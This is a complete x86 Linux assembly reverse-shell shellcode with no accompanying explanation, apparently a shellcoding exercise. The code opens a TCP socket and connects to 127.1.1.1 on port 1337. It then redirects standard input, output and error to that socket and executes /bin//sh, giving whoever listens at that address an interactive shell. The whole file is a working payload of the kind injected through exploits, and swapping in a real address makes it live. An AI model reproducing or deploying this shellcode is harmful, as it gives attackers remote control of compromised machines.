global _start
section .text
_start:
   ; int socketcall(int call, unsigned long *args)
   ; sockfd = socket(int socket_family, int socket_type, int protocol)
   sub ebx, ebx
   mov ecx, ebx
   mul ecx
   sub esp, 12
   mov dword [esp+0x8], ebx   ; IP_PROTO 0
   mov dword [esp+0x4], 0x1   ; SOCK_STREAM 1
   mov dword [esp], 0x2       ; AF_INET 2
   mov ecx, esp               ; move struct pointer into ECX
   mov eax, 0x66
   inc ebx
   int 0x80
   xchg esi, eax              ; ESI --> SOCKFD
 
  ; int socketcall(int call, unsigned long *args)
  ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
  inc ebx                     ; 0x1 becomes 0x2 AF_INET (0x2)
  push 0x0101017F             ; sin_addr.s_addr = 127.1.1.1
  push word 0x3905            ; sin_port = htons(1337)
  push bx                     ; push 0x2 (AF_INET)
  inc ebx                     ; 0x2 becomes 0x3 (SYS_CONNECT)
  mov ecx, esp                ; move struct pointer into ECX
  push 0x10                   ; sizeof (sockaddr)
  push ecx                    ; pointer sockaddr
  push esi                    ; push sockfd onto the stack
  mov ecx, esp                ; pointer to args on the stack into ecx
  mov eax, 0x66               ; socketcall()
  int 0x80
  xchg ebx, esi               ; EBX --> SOCKFD
  sub ecx, ecx
  mov cl, 0x2
loop:
  mov al, 0x3f                ; SYS_DUP2 syscall
  int 0x80                    ; call SYS_DUP2
  dec ecx                     ; decrement loop counter
  jns loop                    ; if sign flag is not set keep looping
  xor edx, edx
  push edx                    ; NULL string terminator
  push 0x68732f2f             ; hs//
  push 0x6e69622f             ; nib/
  mov ecx, edx                ; null
  mov ebx, esp                ; pointer to args into ebx
  mov al, 0x0b                ; execve systemcall
  int 0x80
